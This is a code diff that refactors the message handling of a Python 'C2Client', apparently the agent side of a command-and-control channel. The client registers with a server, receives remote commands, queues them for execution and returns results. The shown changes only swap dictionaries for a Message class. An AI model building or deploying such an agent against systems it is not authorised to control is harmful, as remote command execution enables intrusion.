@@ -17,6 +17,7 @@ import os
 import argparse
 import subprocess
 from typing import Dict
+from message import Message
 
 # ==================== CONFIGURATION ====================
 
@@ -28,20 +29,18 @@ logger = logging.getLogger(__name__)
 
 # ==================== MESSAGE HANDLING ====================
 
-async def send_message(writer, message: Dict) -> bool:
+async def send_message(writer, message: Message) -> bool:
     """Send JSON message"""
     try:
-        plaintext = json.dumps(message)
-        payload = json.dumps(plaintext).encode()
-        
-        writer.write(len(payload).to_bytes(4, 'big') + payload)
+        logger.info(f"Sending message of type: {message.type}")
+        writer.write(message.to_payload())
         await writer.drain()
         return True
     except Exception as e:
         logger.error(f"Failed to send message: {e}")
         return False
 
-async def receive_message(reader) -> Dict:
+async def receive_message(reader) -> Message:
     """Receive JSON message"""
     try:
         logger.info("Waiting for message...")
@@ -50,9 +49,7 @@ async def receive_message(reader) -> Dict:
         logger.info(f"Received message length: {length}")
         
         payload = await asyncio.wait_for(reader.readexactly(length), timeout=30)
-        plaintext = json.loads(payload.decode())
-        
-        return plaintext if plaintext else None
+        return Message.from_payload(payload)
     except asyncio.TimeoutError:
         logger.debug("Receive timeout (normal for idle connections)")
         return None
@@ -91,17 +88,14 @@ class C2Client:
             # Send registration message
             await send_message(
                 self.writer,
-                {
-                    "type": "register",
-                    "client_id": self.client_id
-                },
+                Message.as_register(self.client_id)
             )
             
             # Receive acknowledgment
             logger.info("Waiting for acknowledgment...")
             ack = await receive_message(self.reader)
-            if ack and ack.get("type") == "ack":
-                logger.info(f"Registered as {ack.get('client_id')}")
+            if ack and ack.type == "ack":
+                logger.info(f"Registered as {ack.client_id}")
                 return True
             else:
                 logger.error("Registration failed")
@@ -172,18 +166,16 @@ class C2Client:
                     # Connection closed or timeout
                     break
                 
-                msg_type = msg.get("type")
-                
-                if msg_type == "command":
+                if msg.type == "command":
                     # Queue command for execution
                     await self.command_queue.put({
-                        "cmd_id": msg.get("cmd_id"),
-                        "command": msg.get("command")
+                        "cmd_id": msg.cmd_id,
+                        "command": msg.command
                     })
-                    logger.info(f"Received command: {msg.get('command')}")
+                    logger.info(f"Received command: {msg.command}")
                 
                 else:
-                    logger.warning(f"Unknown message type: {msg_type}")
+                    logger.warning(f"Unknown message type: {msg.type}")
             
             except Exception as e:
                 logger.error(f"Command listener error: {e}")
@@ -242,12 +234,7 @@ class C2Client:
                 if self.writer and not self.writer.is_closing():
                     await send_message(
                         self.writer,
-                        {
-                            "type": "result",
-                            "cmd_id": cmd_id,
-                            "result": result,
-                            "exec_time_ms": exec_time_ms
-                        },
+                        Message.as_result(cmd_id, result, exec_time_ms)
                     )
                     logger.info(f"Result sent ({exec_time_ms:.1f}ms)")
                 
